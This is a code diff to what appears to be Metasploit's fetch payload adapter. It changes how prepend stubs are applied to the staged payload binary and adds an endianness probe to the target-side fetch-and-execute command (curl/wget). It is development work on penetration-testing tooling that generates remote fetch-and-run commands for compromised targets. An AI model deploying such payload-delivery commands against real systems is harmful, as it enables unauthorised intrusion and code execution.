@@ -106,6 +106,16 @@ module Msf::Payload::Adapter::Fetch
     Rex::Socket.to_authority(fetch_bindhost, fetch_bindport)
   end
 
+  # Unlike a normal payload, #generate here does not return raw payload bytes —
+  # it returns the fetch-and-execute shell command (curl/wget/etc.) to run on
+  # the target, staging the actual served payload binary as a side effect via
+  # #add_srv_entry. Because of that, prepend stubs (PrependFork,
+  # PrependSetuid, etc.) can't be applied at the #generate_complete layer the
+  # way other payload types do — that would run apply_prepends over the shell
+  # command string instead of the binary, corrupting it. Instead,
+  # apply_prepends is called at the two points below where the served
+  # payload's raw bytes actually get assembled, before they're handed to
+  # generate_payload_exe/add_srv_entry. See #generate_complete.
   def generate(opts = {})
     if opts[:dynamic_arch].nil?
       @srv_resources = []
@@ -120,7 +130,7 @@ module Msf::Payload::Adapter::Fetch
         add_srv_entry(srvuri, 'x', opts)
       else
         opts[:dynamic_arch] = false
-        opts[:code] = super(opts)
+        opts[:code] = apply_prepends(super(opts))
         add_srv_entry(srvuri, generate_payload_exe(opts), opts)
       end
 
@@ -136,8 +146,16 @@ module Msf::Payload::Adapter::Fetch
       vprint_status("Command to execute on target: #{cmd}")
       cmd
     else
-      super(opts)
+      apply_prepends(super(opts))
     end
+  end
+
+  # Intentionally not the inherited `apply_prepends(generate)`: prepends are
+  # already baked into the served payload bytes inside #generate, so
+  # reapplying apply_prepends here would double them up on the binary (or run
+  # them over the returned shell command, which isn't payload bytes at all).
+  def generate_complete
+    generate
   end
 
   # Dispatches command generation to the selected FETCH_COMMAND helper.
@@ -382,7 +400,7 @@ module Msf::Payload::Adapter::Fetch
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
     end
-    get_file_cmd << '?arch=$(uname -m)' if dynamic_arch
+    get_file_cmd << '?arch=$(uname -m)\&endian=$(printf %d \\\'$(head -c6 /bin/sh|tail -c1))' if dynamic_arch
     _execute_add(get_file_cmd)
   end
 
@@ -498,7 +516,7 @@ module Msf::Payload::Adapter::Fetch
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
     end
-    get_file_cmd << '?arch=$(uname -m)' if dynamic_arch
+    get_file_cmd << '?arch=$(uname -m)\&endian=$(printf %d \\\'$(head -c6 /bin/sh|tail -c1))' if dynamic_arch
     _execute_add(get_file_cmd)
   end
 
